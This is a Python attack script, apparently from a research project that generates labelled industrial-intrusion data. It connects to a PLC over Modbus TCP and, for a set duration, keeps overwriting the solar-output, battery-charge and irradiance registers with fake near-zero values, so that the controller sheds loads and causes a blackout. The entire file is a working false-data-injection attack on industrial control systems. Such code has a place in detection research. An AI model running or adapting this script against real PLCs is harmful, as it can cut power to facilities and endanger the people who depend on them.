"""
Attack #6: Load_Shedding_Sabotage (Load Shedding Sabotage)
==================================================================
Target register: HR14 (Solar) + HR20 (SoC) + HR22 (Irradiance)
Technique: Coordinated false data injection reporting zero generation and
           a near-empty battery.
Effect: The PLC perceives a fake crisis and sheds loads unnecessarily,
        causing a blackout.
MITRE ATT&CK for ICS: T0831 - Manipulation of Control
"""
import time, sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from pymodbus.client import ModbusTcpClient
from attacks.config import (PLC_IP, PLC_PORT, UNIT_ID,
    HR14_SOLAR_KW, HR20_SOC, HR22_IRRADIANCE, LABEL_LOAD_SABOTAGE)

ATTACK_NAME = "Load_Shedding_Sabotage"
ATTACK_ID   = LABEL_LOAD_SABOTAGE

# Fake values: Solar=0, battery SoC=5%, Irradiance=0
FAKE_SOLAR = 0
FAKE_SOC   = 5
FAKE_IRRAD = 0

def run_attack(duration_sec=600, label_manager=None):
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
    if not client.connect():
        print(f"[-] PLC connection failed: {PLC_IP}:{PLC_PORT}")
        return False

    print(f"{'='*65}")
    print(f"  ATTACK #{ATTACK_ID}: {ATTACK_NAME}")
    print(f"  Target: {PLC_IP}:{PLC_PORT}")
    print(f"  Solar=0kW, SoC=5%, Irradiance=0 W/m2")
    print(f"  Duration: {duration_sec}s ({duration_sec//60} min)")
    print(f"{'='*65}")

    if label_manager:
        label_manager.log_attack_start(ATTACK_ID, ATTACK_NAME,
            f"HR14={FAKE_SOLAR}, HR20={FAKE_SOC}, HR22={FAKE_IRRAD}")

    start_time = time.time()
    pkt_count = 0

    try:
        while (time.time() - start_time) < duration_sec:
            try:
                client.write_register(address=HR14_SOLAR_KW, value=FAKE_SOLAR)
                client.write_register(address=HR20_SOC, value=FAKE_SOC)
                client.write_register(address=HR22_IRRADIANCE, value=FAKE_IRRAD)
                pkt_count += 3
            except Exception:
                try:
                    client.close()
                    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)
                    client.connect()
                except Exception:
                    pass
                time.sleep(0.5)
                continue

            if pkt_count % 300 == 0:
                rem = duration_sec - (time.time() - start_time)
                print(f"  [LOAD] {pkt_count} packets | fake crisis ongoing | remaining: {rem:.0f}s")
            time.sleep(0.2)

    except KeyboardInterrupt:
        print("\n  [LOAD] Manual stop!")
    finally:
        elapsed = time.time() - start_time
        client.close()
        if label_manager:
            label_manager.log_attack_end(ATTACK_ID, ATTACK_NAME,
                f"{pkt_count} packets, {elapsed:.1f}s")
        print(f"\n  [LOAD] {pkt_count} packets, {elapsed:.1f}s")
        return True

if __name__ == "__main__":
    run_attack(duration_sec=60)
